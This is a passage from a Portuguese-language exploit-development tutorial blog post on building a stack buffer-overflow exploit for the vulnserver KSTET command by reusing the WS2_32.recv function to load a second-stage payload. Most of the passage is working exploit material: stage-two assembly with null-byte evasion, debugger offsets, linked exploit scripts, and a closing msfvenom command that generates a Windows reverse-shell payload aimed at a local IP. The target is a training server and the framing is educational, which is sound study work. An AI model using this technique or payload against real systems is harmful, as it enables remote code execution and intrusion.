width="1116" height="664" class="lazyload" data-proofer-ignore></a></p><p>Note que a proxima instrução a ser executada é a CALL EAX e que EAX detém o endereço de memória da função WS2_32.recv, e na pilha para a chamada da função tem-se 4 parâmetros conforme abaixo:</p><ol><li><strong>Socket = 0x50</strong>: Nosso file descripto do socket do cliente;<li><strong>Buffer = 0x00E2F9F0</strong>: Endereço de memória onde será gravado os dados recebidos pelo socket;<li><strong>BufSize = 0x0208 (Decimal 520)</strong>: Tamanho do buffer que deve ser lido;<li><strong>Flags = 0</strong>: Podemos ignorar.</ol><p>Sendo assim observe que coloquei estratégicamente o endereço onde será gravado os novos dados recebidos para logo depois da minha posição atual de execução, sendo assim após a chamada da função WS2_32.recv continua-se a execução até chegar no shellcode.</p><p>Agora observer abaixo logo após a chamada da função <em><strong>recv,</strong></em> para efeitos didáticos o shellcode que passei são 520 E que tem hexa 0x45</p><p><a href="/assets/2019/02/07-2019-02-17_131525.png" class="img-link shimmer" ><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1116 546'%3E%3C/svg%3E" data-src="/assets/2019/02/07-2019-02-17_131525.png" alt="" width="1116" height="546" class="lazyload" data-proofer-ignore></a></p><p>Do ponto de vista do meu código foi chamado da seguinte forma:</p><p>[sourcecode language="python"]#!/usr/bin/python<br /> # -*- coding: utf-8 -*-<br /> ...<br /> ...<br /> ...<br /> exp.send(buffer)<br /> sleep(1)<br /> shellcode = &quot;E&quot; * 520<br /> exp.send(shellcode)<br /> [/sourcecode]</p><p>Onde a variável <em><strong>buffer</strong> </em>detém todo o código para fazer o buffer overflow e a chamada da função <em><strong>recv</strong> </em>(veremos esse código mais a frente) e a variável <em><strong>shellcode</strong> </em>são 520 Es</p><p>&nbsp;</p><h3>0x08 - Encontrando a função WS2_32.recv</h3><p>Agora que sabemos que iremos usar a função WS2_32.recv precisamos encontra-la em nosso código, o que sabemos é que ela ja foi usada em nossa aplicação, sendo assim ela estará em nossa IAT (Import Address Table) e em algum lugar da nossa aplicação.</p><p>Para localiza-la reinicie o Immunity Debbuger, anexe a aplicação e no painel superior esquerdo clique com o botão direito do mouse e clique em View &gt; Module 'vulnserv', caso a opção Module 'vulnserv' não apareça é porque você ja está neste módulo, se isso for verdade na barra de titulo você verá algo como 'module vulnserv'.</p><p><a href="/assets/2019/02/08-2019-02-16_172737.png" class="img-link shimmer" ><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1120 967'%3E%3C/svg%3E" data-src="/assets/2019/02/08-2019-02-16_172737.png" alt="" width="1120" height="967" class="lazyload" data-proofer-ignore></a></p><p>Agora no painel superior esquerdo clique com o botão direito do mouse e clique em Search for &gt; All intermodular calls</p><p><a href="/assets/2019/02/08-2019-02-16_172838.png" class="img-link shimmer" ><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1120 972'%3E%3C/svg%3E" data-src="/assets/2019/02/08-2019-02-16_172838.png" alt="" width="1120" height="972" class="lazyload" data-proofer-ignore></a></p><p>Este processo nos mostrara a lista de todas as chamadas para outros módulos. Vamos clicar no cabeçalho na coluna 'Destination' para ordenar por nome. É importante notar que a ordenação ocorrerá por nome da função não por módulo. Por exemplo, WS2_32.bind e WS2_32.recv serão ordenadas nas palavras bind e recv respectivamente.</p><p>Após a ordenação podemos facilmente localizar a chamada para a recv, após localizado a selecione e pressione F2 para adicionar um breakpoint. Você verá que a instrução ficará marcada conforme a a imagem abaixo:</p><p><a href="/assets/2019/02/08-2019-02-16_173008.png" class="img-link shimmer" ><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1120 969'%3E%3C/svg%3E" data-src="/assets/2019/02/08-2019-02-16_173008.png" alt="" width="1120" height="969" class="lazyload" data-proofer-ignore></a></p><p>Após adicionar o breakkpoint clique com o botão direito e clique em Follow in Disassembler</p><p><a href="/assets/2019/02/08-2019-02-16_173213.png" class="img-link shimmer" ><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 670 242'%3E%3C/svg%3E" data-src="/assets/2019/02/08-2019-02-16_173213.png" alt="" width="670" height="242" class="lazyload" data-proofer-ignore></a></p><p>Indo para a chamada da função WS2_32.recv</p><p><a href="/assets/2019/02/08-2019-02-17_142314.png" class="img-link shimmer" ><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1116 564'%3E%3C/svg%3E" data-src="/assets/2019/02/08-2019-02-17_142314.png" alt="" width="1116" height="564" class="lazyload" data-proofer-ignore></a></p><p>Para localizar o nosso file descritor do socket, vamos alterar nosso exploit substituindo os As do nosso buffer por 0xCC que é um breakpoint. Isso é ara simplificar nosso processo.</p><p><script src="https://gist-it.appspot.com/github/helviojunior/vulnserver/blob/master/exploit2_WS2_32_Recv/08-filedescriptor-find.py"></script></p><p>Quando executado o processo deverá parar no breakpoint do recv</p><p><a href="/assets/2019/02/08-2019-02-17_142940.png" class="img-link shimmer" ><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1116 968'%3E%3C/svg%3E" data-src="/assets/2019/02/08-2019-02-17_142940.png" alt="" width="1116" height="968" class="lazyload" data-proofer-ignore></a></p><p>Neste ponto podemos observar nossa pilha (stack) os argumentos que estão sendo passados para a função recv. Que fazendo um paralelo com a documentação do MSDN temos os seguintes parâmetros:</p><p>[sourcecode language="python"]int recv(<br /> SOCKET 0x00000050,<br /> char *0x002B3358,<br /> int 0x1000,<br /> int 0x00000000<br /> );<br /> [/sourcecode]</p><p>Então nosso<em> file descriptor</em> que tanto desejamos é 0x00000050. Vamos permitir a execução da nossa aplicação pressionando F9 (pode ser que precise reiniciar a aplicação e o immunity e retirar o breakpoint da função recv pois algumas vezes o sistema não permite dar continuidade na execução, se isso ocorrer reinicie o immunity e anexe novamente a aplicação e rode o exploit novamente).</p><p><strong>Nota de endereço</strong>: Neste ponto de pressionarmos mais uma vez o F7 iremos para a tela abaixo onde será apresentado o endereço da chamada da WS2_32.recv em nossa IAT (Import Address Table), anote este endereço pois utilizaremos bem mais a frente.</p><p><a href="/assets/2019/02/08-2019-02-16_194102.png" class="img-link shimmer" ><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 716 561'%3E%3C/svg%3E" data-src="/assets/2019/02/08-2019-02-16_194102.png" alt="" width="716" height="561" class="lazyload" data-proofer-ignore></a></p><h3>0x09 - Encontrando o file descriptor</h3><p>Uma vez encontrado o valor do <em>file descriptor</em> agora precisamos encontrar onde o valor do mesmo está armazenado e qual a relação e distância na pilha ele está da nossa posição atual.</p><p>Com nosso exploit parado no primeiro 0xCC no painel esquero superior clique com o botão direito do mouse e clique em Search for &gt; Binary String</p><p><a href="/assets/2019/02/09-2019-02-16_175126.png" class="img-link shimmer" ><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1116 966'%3E%3C/svg%3E" data-src="/assets/2019/02/09-2019-02-16_175126.png" alt="" width="1116" height="966" class="lazyload" data-proofer-ignore></a></p><p>Então procure pelo valor do file descriptor (em nosso caso 0x00000050)</p><p><a href="/assets/2019/02/09-2019-02-16_175223.png" class="img-link shimmer" ><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1116 970'%3E%3C/svg%3E" data-src="/assets/2019/02/09-2019-02-16_175223.png" alt="" width="1116" height="970" class="lazyload" data-proofer-ignore></a></p><p>Quando fazemos isso, podemos buscar as outras opções pressionando CTRL + L. No nosso ambiente encontramos as seguintes opções</p><p><a href="/assets/2019/02/09-2019-02-17_145246.png" class="img-link shimmer" ><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1116 969'%3E%3C/svg%3E" data-src="/assets/2019/02/09-2019-02-17_145246.png" alt="" width="1116" height="969" class="lazyload" data-proofer-ignore></a></p><p><a href="/assets/2019/02/09-2019-02-17_145300.png" class="img-link shimmer" ><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1116 970'%3E%3C/svg%3E" data-src="/assets/2019/02/09-2019-02-17_145300.png" alt="" width="1116" height="970" class="lazyload" data-proofer-ignore></a></p><p>Escolhi a primeira opção</p><p>[sourcecode language="c"]00FAF8B1 0000 ADD BYTE PTR DS:[EAX],AL<br /> 00FAF8B3 0050 00 ADD BYTE PTR DS:[EAX],DL<br /> 00FAF8B6 0000 ADD BYTE PTR DS:[EAX],AL<br /> 00FAF8B8 0000 ADD BYTE PTR DS:[EAX],AL<br /> 00FAF8BA 0000 ADD BYTE PTR DS:[EAX],AL<br /> [/sourcecode]</p><p>Quando nós alcançamos a função recv pela primeira vez a pilha de memória estava na posição</p><p>[sourcecode language="c"]00FAF9F8<br /> [/sourcecode]</p><p>Baseado nessas informações podemos calcular a distancia entre a posição atual da pilha e o endereço atual</p><p>[sourcecode language="c"]0x00F7F9F8 (Endereço desejado) - 0x00F7F8B1 (ESP) = Hex: 0x0147 ou Decimal: 327<br /> [/sourcecode]</p><p>Sendo assim vamos começar a escrita do nosso segundo estágio do exploit</p><p>[sourcecode language="c"]PUSH ESP ; Armazena a posição atual de ESP na pilha<br /> POP ECX ; Retira o valor da pilha e o coloca em ECX<br /> SUB CX,0x147 ; Subtrai 0x147 de ECX<br /> [/sourcecode]</p><p>Usando o msf-nasm_shell para nos ajudar nessa tarefa</p><p>[sourcecode language="c"]root@M4v3r1cK:~# msf-nasm_shell<br /> nasm &amp;amp;gt; push esp<br /> 00000000 54 push esp<br /> nasm &amp;amp;gt; pop ecx<br /> 00000000 59 pop ecx<br /> nasm &amp;amp;gt; sub cx,0x147<br /> 00000000 6681E94701 sub cx,0x147<br /> nasm &amp;amp;gt;<br /> [/sourcecode]</p><p>O exploit ficou assim:</p><p><script src="https://gist-it.appspot.com/github/helviojunior/vulnserver/blob/master/exploit2_WS2_32_Recv/09-stage2.py"></script></p><p>Ao executa-lo temos o ECX apontando exatamente para a posição de memória que contém o endereço do <em>file descriptor</em>:</p><p><a href="/assets/2019/02/09-2019-02-16_183848.png" class="img-link shimmer" ><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1116 969'%3E%3C/svg%3E" data-src="/assets/2019/02/09-2019-02-16_183848.png" alt="" width="1116" height="969" class="lazyload" data-proofer-ignore></a></p><p>Em um mundo perfeito isso estaria certo, mas como logo a frente iremos resgatar este valor usando a chamada <strong>PUSH DWORD PTR DS:[ECX]</strong>, vamos executa-la agora apenas para ver o que acontece.</p><p><a href="/assets/2019/02/09-2019-02-17_154657.png" class="img-link shimmer" ><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1116 967'%3E%3C/svg%3E" data-src="/assets/2019/02/09-2019-02-17_154657.png" alt="" width="1116" height="967" class="lazyload" data-proofer-ignore></a></p><p>Podemos ver que o valor inserido na pilha foi <strong>0x50000000</strong> e não <strong>0x00000050</strong> como o esperado, isso ocorre devido ao endianess, sendo assim precisamos alterar nosso exploit para subtrair 3 bytes a menos sendo 0x144 ao invés de 0x147, ficando assim:</p><p><script src="https://gist-it.appspot.com/github/helviojunior/vulnserver/blob/master/exploit2_WS2_32_Recv/09-stage2-correct.py"></script></p><p><a href="/assets/2019/02/09-2019-02-17_155316.png" class="img-link shimmer" ><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1116 969'%3E%3C/svg%3E" data-src="/assets/2019/02/09-2019-02-17_155316.png" alt="" width="1116" height="969" class="lazyload" data-proofer-ignore></a></p><h3>0x0a - Chamando WS2_32.recv</h3><p>Com nosso file descriptor podemos calcular/montar os outros 3 parametros necessários para a chamada da função WS2_32.recv.</p><p>Retomando como deve ser a chamada da função, como visto anteriormente, os valores devem ser similares a estes (segund p padrão da documentação do MSDN):</p><p>[sourcecode language="c"]int recv(<br /> SOCKET 0x00000050,<br /> char *0x002B3358,<br /> int 0x1000,<br /> int 0x00000000<br /> );<br /> [/sourcecode]</p><p>Conforme visto e certificado na imagem abaixo:</p><p><a href="/assets/2019/02/08-2019-02-17_142940.png" class="img-link shimmer" ><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1116 968'%3E%3C/svg%3E" data-src="/assets/2019/02/08-2019-02-17_142940.png" alt="" width="1116" height="968" class="lazyload" data-proofer-ignore></a></p><p>Como colocaremos os valores diretamente na pilha devemos lembrar que o empilhamento deve ocorrer de forma inversa (caso tenha dúvidas deste funcionamento veja nosso post <a href="https://www.helviojunior.com.br/it/security/criacao-de-exploits/criacao-de-exploits-parte-0-um-pouco-de-teoria/" target="_blank" rel="noopener noreferrer">Criação de Exploits – Parte 0 – Um pouco de teoria</a> onde explico o funcionamento da pilha e outas coisas mais), sendo assim o primeiro item a ser empilhado é o quarto parâmetro (flags), para posteriormente o tamanho do buffer, a localização da memória a ser utilizada como buffer e por fim o file descriptor (valor este qe ja temos armazenado em ECX)</p><p>Outro ponto importante que devemos observar é que conforme realizamos um empilhamento, ou seja PUSH, o endereço da pilha vai subtraindo e conforme observado na imagem abaixo o endereço da nossa pilha está localizado ligeiramente abaixo do nosso buffer, isso faz com que cada valor que vamos colocar na pilha reduz mais o nosso restruto espaço de 66 bytes, sendo assim nossa primeira preoocupação antes de colocar os valores na pilha é alterar a posição da pilha para contornar este problema.</p><p><a href="/assets/2019/02/10-2019-02-17_155941.png" class="img-link shimmer" ><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1116 969'%3E%3C/svg%3E" data-src="/assets/2019/02/10-2019-02-17_155941.png" alt="" width="1116" height="969" class="lazyload" data-proofer-ignore></a></p><p>Então nada que jogar a pilha para 80 bytes a menos não resolva</p><p>[sourcecode language="c"]SUB ESP, 0X50<br /> [/sourcecode]</p><p>Vamos agora tratar o primeiro parametro a ser empilhado (4 argumento da função recv) que é a flag que necessita ter valor 0x00 como 0x00 é um null byte e não podemos usar em nosso exploit vamos usar a técnica do XOR:</p><p>[sourcecode language="c"]XOR EAX,EAX ; Zera eax<br /> PUSH EAX ; Coloca EAX na pilha<br /> [/sourcecode]</p><p>O segundo valor a ser empilhado (3 argumento da função recv) é o tamanho do buffer, que em nosso caso escolhi 520 (hexa 0x0208) em virtude de uma questão estratégica de não usar o null byte neste processo. Nesta atribuição iremos usar alguns recursos do assembly que nos permite atribuir diretamente algumas partes do nosso registrador, para facilitar o entendimento de uma olhada na imagem abaixo:</p><p><a href="/assets/2019/02/10-registradores.png" class="img-link shimmer" ><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1009 711'%3E%3C/svg%3E" data-src="/assets/2019/02/10-registradores.png" alt="" width="1009" height="711" class="lazyload" data-proofer-ignore></a></p><p>Representado com os valores que desejamos abaixo:</p><p>[sourcecode language="c"]+----------------------+<br /> | | EAX |<br /> |32 bits | 00 00 02 08 |<br /> +--------|-------------+<br /> | | AX |<br /> |16 bits | 02 08 |<br /> +--------|-------------+<br /> | | AH AL |<br /> |8 bits | 02 08 |<br /> +----------------------+<br /> [/sourcecode]</p><p>Sendo assim podemos atribuir da seguinte forma:</p><p>[sourcecode language="c"]XOR EAX,EAX ; Zera eax<br /> MOV AL,0x08 ; Coloca 0x08 em AL<br /> MOV AH,0x02 ; Coloca 0x02 em AH<br /> PUSH EAX ; Coloca EAX na pilha<br /> [/sourcecode]</p><p>Agora vamos para o terceiro valor a ser empilhado (segundo parâmetro da função recv) que é o endereço de memória onde deve-se gravar o que for recebido pelo socket do cliente. Como sabemos que nosso ESP foi deslocado 80 bytes e que antes do deslocamento ele estava ligeiramente abaixo do nosso restrito espaço de 66 bytes vamos usar o mesmo parâmetro de calculo para estimar a posição onde deve ser gravado os dados lidos pelo socket:</p><p>[sourcecode language="c"]PUSH ESP ; Armazena a posição atual de ESP na pilha<br /> POP EDX ; Retira o valor da pilha e o coloca em EDX<br /> ADD EDX, 50 ; Adiciona 80 bytes (hexa 0x50) ao registrador EDX<br /> PUSH EDX ; Coloca EDX na pilha<br /> [/sourcecode]</p><p>Por fim vamos colocar na pilha o valor do nosso file descriptor (enteriormente calculado)</p><p>[sourcecode language="c"]PUSH DWORD PTR DS:[ECX] ; Coloca na pilha o valor que existe no endereço de memória do ECX<br /> [/sourcecode]</p><p>No final deste processo temos o código abaixo:<br /> <script src="https://gist-it.appspot.com/github/helviojunior/vulnserver/blob/master/exploit2_WS2_32_Recv/10-arguments.py"></script></p><p>E ao executa-lo o seguinte resultado:</p><p><a href="/assets/2019/02/10-2019-02-17_163218.png" class="img-link shimmer" ><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1116 967'%3E%3C/svg%3E" data-src="/assets/2019/02/10-2019-02-17_163218.png" alt="" width="1116" height="967" class="lazyload" data-proofer-ignore></a></p><p>Fazendo nosso paralelo com a documentação MSDN temos os valores abaixo, lembrando que o endereço de memória é dinâmico, então se altera a cada execução</p><p>[sourcecode language="c"]int recv(<br /> SOCKET 0x00000050,<br /> char *0x00FEF9F0,<br /> int 0x00000208,<br /> int 0x00000000<br /> );<br /> [/sourcecode]</p><p>Agora temos todos os parâmetros necessários para chamar a função WS2_32.recv, existem diversos métodos para chamar a função, utilizaremos um deles e ao meu ver o mais seguro deles.</p><p>Mas antes disso precisamos saber qual é o endereço, creio que você se lembre daquele endereço que colocamos o breakpoint e eu falei p/ anotar que usariamos mais a frente? Não? Nessas alturas do campeonato, com tanta coisa eu também não lembraria, nós falamos dele no ítem 0x08, mas para facilitar o trabalho segue ele abaixo:</p><p>[sourcecode language="c"]0x0040252c<br /> [/sourcecode]</p><p>Para coloca-lo na pilha vamos adiciona-lo em EAX e depois fazer um CALL EAX, mas ai temos um desafio, o endereço começa com ox00 que é um null byte, então o que fazemos? Sempre temos alguma carta na manga. Neste caso vamos colocar o valor deslocado 8 bits para a esquerda, e depois fazer o deslocamente para a direita. Simples né?</p><p>Não, então vamos entender, supondo que tenhamos o valor abaixo:</p><p>[sourcecode language="c"]+----------------------+<br /> | | EAX |<br /> |32 bits | 40 25 2c 11 |<br /> +--------|-------------+<br /> [/sourcecode]</p><p>Ao realizar o deslocamento dele 8 bits para a direita ele passará a ter o seguinte valor:</p><p>[sourcecode language="c"]+----------------------+<br /> | | EAX |<br /> |32 bits | 00 40 25 2c |<br /> +--------|-------------+<br /> [/sourcecode]</p><p>Que é exatamente o que queremos, e para fazer isso em asembly usamos a instrução shr ficando assim:</p><p>[sourcecode language="c"]MOV EAX,0x40252c11 ; Atribui o valor 0x40252c11 em EAX<br /> SHR EAX,BYTE 0x8 ; Faz o deslocamento de 8 bits para a direita<br /> [/sourcecode]</p><p>E por fim fazemos o call de EAX</p><p>[sourcecode language="c"]CALL EAX<br /> [/sourcecode]</p><p>Antes de executar nosso exploit para o teste necessitamos criar 520 bytes para ser o shellcode bem como fazer o envio dele pelo socket ficando então nosso código como o abaixo:</p><p><script src="https://gist-it.appspot.com/github/helviojunior/vulnserver/blob/master/exploit2_WS2_32_Recv/10-callingrecv.py"></script></p><p>Ao executa-lo temos o seguinte cenário:</p><p>Antes da chamada do CALL EAX</p><p><a href="/assets/2019/02/07-2019-02-17_131457.png" class="img-link shimmer" ><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1116 664'%3E%3C/svg%3E" data-src="/assets/2019/02/07-2019-02-17_131457.png" alt="" width="1116" height="664" class="lazyload" data-proofer-ignore></a></p><p>Mais uma vez fazendo o paralelo com a documentação do MSDN temos os seguintes valores:</p><p>[sourcecode language="c"]int recv(<br /> SOCKET 0x00000050,<br /> char *0x00FEF9F0,<br /> int 0x00000208,<br /> int 0x00000000<br /> );<br /> [/sourcecode]</p><p>Note que o endereço de memória 00FEF9F0 tem alguns NOPs seguido de outros códigos que logo depois da chamada do CALL EAX são inteiramente substituidos pelo nosso pseudo shellcode (0x45)</p><p><a href="/assets/2019/02/07-2019-02-17_131525.png" class="img-link shimmer" ><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1116 546'%3E%3C/svg%3E" data-src="/assets/2019/02/07-2019-02-17_131525.png" alt="" width="1116" height="546" class="lazyload" data-proofer-ignore></a></p><p>&nbsp;</p><h3>0x0b - Aproveite o shell</h3><p>Com tudo pronto basta alterar a variável do shellcode dentro do nosso exploit pelos shellcode desejado e seja feliz</p><p>[sourcecode language="shell"]msfvenom -p windows/shell_reverse_tcp lhost=192.168.15.177 lport=4444 -a x86 --platform win -b &quot;\x00&quot; -f python<br /> [/sourcecode]</p><p><a href="/assets/2019/02/11-2019-02-16_222310.png" class="img-link shimmer" ><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1009 567'%3E%3C/svg%3E" data-src="/assets/2019/02/11-2019-02-16_222310.png" alt="" width="1009" height="567" class="lazyload" data-proofer-ignore></a></p><p><script src="https://gist-it.appspot.com/github/helviojunior/vulnserver/blob/master/exploit2_WS2_32_Recv/11-final.py"></script></p><p><a href="/assets/2019/02/11-2019-02-16_222422.png" class="img-link shimmer" ><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1116 994'%3E%3C/svg%3E" data-src="/assets/2019/02/11-2019-02-16_222422.png" alt="" width="1116" height="994" class="lazyload" data-proofer-ignore></a></p><p><a href="/assets/2019/02/10-2019-02-17_075237.png" class="img-link shimmer" ><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 578 307'%3E%3C/svg%3E" data-src="/assets/2019/02/10-2019-02-17_075237.png" alt="" width="578" height="307" class="lazyload" data-proofer-ignore></a></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/cria%C3%A7%C3%A3o-de-exploits/'>Criação de Exploits</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Criação de Exploits - Parte 4 - Estudo de caso: vulnserver KSTET com reaproveitamento da função WS2_32 Recv - Helvio Junior&url=https://www.helviojunior.com.br/it/security/criacao-de-exploits/criacao-de-exploits-parte-4-estudo-de-caso-vulnserver-kstet-com-reaproveitamento-da-funcao-ws2_32-recv/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Criação de Exploits - Parte 4 - Estudo de caso: vulnserver KSTET com reaproveitamento da função WS2_32 Recv - Helvio Junior&u=https://www.helviojunior.com.br/it/security/criacao-de-exploits/criacao-de-exploits-parte-4-estudo-de-caso-vulnserver-kstet-com-reaproveitamento-da-funcao-ws2_32-recv/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Criação de Exploits - Parte 4 - Estudo de caso: vulnserver KSTET com reaproveitamento da função WS2_32 Recv - Helvio Junior&url=https://www.helviojunior.com.br/it/security/criacao-de-exploits/criacao-de-exploits-parte-4-estudo-de-caso-vulnserver-kstet-com-reaproveitamento-da-funcao-ws2_32-recv/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https://www.helviojunior.com.br/it/security/criacao-de-exploits/criacao-de-exploits-parte-4-estudo-de-caso-vulnserver-kstet-com-reaproveitamento-da-funcao-ws2_32-recv/" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank" rel="noopener" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/security/osint/localizando-ips-que-respondem-para-uma-url/">Localizando IPs que respondem para uma URL</a><li><a href="/security/osint/locating-url-ips-bypass-waf/">Locating IPs that respond to a URL</a><li><a href="/security/edr/instalando-elasticsearch-edr/">Instalando Elasticsearch EDR</a><li><a href="/it/instalando-openvpn-com-autenticacao-em-mysql/">Instalando OpenVPN com autenticação em MySQL</a><li><a href="/it/osce-osed-e-ecxd-certificacoes-de-desenvolvimento-de-exploits/">OSCE, OSED e eCXD: Certificações de desenvolvimento de Exploits</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/offensive-security/">Offensive Security</a> <a class="post-tag" href="/tags/pentest/">Pentest</a> <a class="post-tag" href="/tags/autoridade-certificadora/">autoridade certificadora</a> <a class="post-tag" href="/tags/ca/">ca</a> <a class="post-tag" href="/tags/certificate-authority/">certificate authority</a> <a class="post-tag" href="/tags/openssl/">openssl</a> <a class="post-tag" href="/tags/osce3/">OSCE3</a> <a class="post-tag" href="/tags/buffer-overflow/">Buffer Overflow</a> <a class="post-tag" href="/tags/osed/">OSED</a> <a class="post-tag" href="/tags/osee/">OSEE</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/it/security/criacao-de-exploits/shellcoding-encontrando-endereco-da-funcao-dinamicamente-analise-da-biblioteca-block_api/"><div class="card-body"> <span class="timeago small" > Aug 15, 2021 <i class="unloaded">2021-08-15T16:26:52-03:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Shellcoding - Encontrando endereço da função dinamicamente. Análise da biblioteca block_api</h3><div class="text-muted small"><p> Introdução Neste artigo iremos dissecar a biblioteca da Metasploit chamada Block API responsável por localizar em tempo de execução o endereço das funções dentro dos módulos carregados na aplicaçã...</p></div></div></a></div><div class="card"> <a href="/it/security/criacao-de-exploits/criacao-de-exploits-parte-0-um-pouco-de-teoria/"><div class="card-body"> <span class="timeago small" > Sep 30, 2018 <i class="unloaded">2018-09-30T17:45:47-03:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Criação de Exploits - Parte 0 - Um pouco de teoria</h3><div class="text-muted small"><p> Neste post irei inaugurar uma nova seção do site onde postarei uma série de tutoriais de como realizar a criação de exploits, a maioria deles, utilizando Buffer Overflow. Caso você deseje segue o l...</p></div></div></a></div><div class="card"> <a href="/it/security/criacao-de-exploits/como-realizar-stack-buffer-overflow/"><div class="card-body"> <span class="timeago small" > Sep 30, 2018 <i class="unloaded">2018-09-30T23:11:59-03:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Criação de Exploits - Parte 1 - Como realizar um Stack buffer overflow?</h3><div class="text-muted small"><p> Este post faz parte da série de criação de exploits, este é o segundo post dessa série, caso não tenha visto de uma olhada primeiramente na Parte 0 - Um pouco de teoria Segue abaixo os vídeos de d...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/it/security/criacao-de-exploits/criacao-de-exploits-parte-3-estudo-de-caso-vulnserver-kstet-com-egghunter/" class="btn btn-outline-primary" prompt="Older"><p>Criação de Exploits - Parte 3 - Estudo de caso: vulnserver KSTET com egghunter</p></a> <a href="/it/ctf-exploit-h2hc-2019/" class="btn btn-outline-primary" prompt="Newer"><p>[CTF - Writeup] Exploit H2HC 2019</p></a></div><div id="disqus" class="pt-2 pb-2"><p class="text-center text-muted small pb-5"> Comments powered by <a href="https://disqus.com/">Disqus</a>.</p></div><script src="/assets/js/lib/jquery.disqusloader.min.js"></script> <script> const options = { scriptUrl: '//.disqus.com/embed.js', disqusConfig: function() { this.page.title = 'Criação de Exploits - Parte 4 - Estudo de caso: vulnserver KSTET com reaproveitamento da função WS2_32 Recv'; this.page.url = 'https://www.helviojunior.com.br/it/security/criacao-de-exploits/criacao-de-exploits-parte-4-estudo-de-caso-vulnserver-kstet-com-reaproveitamento-da-funcao-ws2_32-recv/'; this.page.identifier = '/it/security/criacao-de-exploits/criacao-de-exploits-parte-4-estudo-de-caso-vulnserver-kstet-com-reaproveitamento-da-funcao-ws2_32-recv/'; } }; $.disqusLoader('#disqus', options); </script></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2024 <a href="https://github.com/helviojunior">Helvio junior (aka M4v3r1ck)</a>. <span data-toggle="tooltip" data-placement="top" title="Some rights reserved.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" 